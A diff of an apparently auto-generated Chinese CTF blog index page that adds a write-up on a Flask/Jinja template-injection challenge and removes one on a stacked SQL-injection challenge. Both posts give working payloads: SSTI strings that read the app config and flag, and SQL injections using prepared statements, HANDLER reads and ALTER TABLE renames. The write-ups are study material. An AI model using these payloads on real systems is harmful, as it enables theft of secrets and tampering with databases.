@@ -147,6 +147,70 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/shrine1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/15/shrine1/" class="post-title-link" itemprop="url">shrine1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-15 21:15:07 / Modified: 21:32:33" itemprop="dateCreated datePublished" datetime="2021-03-15T21:15:07+08:00">2021-03-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app &#x3D; flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[&#39;FLAG&#39;] &#x3D; os.environ.pop(&#39;FLAG&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;shrine&#x2F;&lt;path:shrine&gt;&#39;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s &#x3D; s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)</span><br><span class="line">        blacklist &#x3D; [&#39;config&#39;, &#39;self&#39;]  &#x2F;&#x2F;config和self被关进了小黑屋</span><br><span class="line">        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;&#x3D;None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s</span><br><span class="line"></span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+<p>可以采用url_for去初始化current_app，从而读取config内容。</p>
+<p>所以直接payload:</p>
+<pre><code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code></pre>
+<p>也可以</p>
+<pre><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/15/Pythonginx/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1014,86 +1078,6 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">buu-随便注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-31 18:20:27" itemprop="dateCreated datePublished" datetime="2021-01-31T18:20:27+08:00">2021-01-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-05 16:56:44" itemprop="dateModified" datetime="2021-03-05T16:56:44+08:00">2021-03-05</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="buu-web第二题，随便注"><a href="#buu-web第二题，随便注" class="headerlink" title="buu-web第二题，随便注"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src="images/buu-sbz1.png" alt="buu-sbz1.png"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src="images/buu-sbz2.png" alt="buu-sbz1.png"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src="images/buu-sbz3.png" alt="buu-sbz1.png"><br>查表如下，有两个<br><img src="images/buu-sbz4.png" alt="buu-sbz1.png"><br>再查表中的列如下(字符串为表名操作时要加反引号)，发现了flag<br><img src="images/buu-sbz5.png" alt="buu-sbz1.png">  </p>
-<h2 id="方法1-预编译"><a href="#方法1-预编译" class="headerlink" title="方法1.预编译"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>
-<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
-`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>
-<p>出现如下图,发现还过滤了set和prepare<br><img src="images/buu-sbz6.png" alt="buu-sbz1.png"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>
-<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
-`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>
-<p>欢天喜地，得到flag<br><img src="images/buu-sbz7.png" alt="buu-sbz1.png">    </p>
-<hr>
-<h2 id="方法2-handler查询"><a href="#方法2-handler查询" class="headerlink" title="方法2.handler查询"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>
-<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>
-<p><img src="images/buu-sbz8.png" alt="buu-sbz1.png"><br>简单快捷，恐怖如斯！     </p>
-<hr>
-<h2 id="方法3-修改表名和列名"><a href="#方法3-修改表名和列名" class="headerlink" title="方法3.修改表名和列名"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src="images/buu-sbz9.png" alt="buu-sbz1.png"><br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>
-<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>
-<p>然后我们用1’ or 1=1 –+直接就能得到  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1163,7 +1147,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">19</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
